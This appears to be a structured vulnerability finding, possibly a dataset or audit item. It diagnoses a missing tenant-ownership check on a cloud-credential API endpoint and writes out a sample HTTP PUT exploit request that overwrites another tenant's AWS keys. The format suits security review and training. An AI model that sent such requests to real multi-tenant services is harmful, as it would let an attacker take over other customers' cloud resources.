diagnosis: The view directly loads CloudCredential using cred_id from the URL path. It performs no ownership check against request.user.tenant, allowing an attacker to overwrite another tenant's cloud provider credentials and hijack external cloud resources.
exploit_request:
PUT /api/credentials/aws/710/ HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"access_key": "AKIAEXPLOITKEY", "secret_key": "evil_secret"}
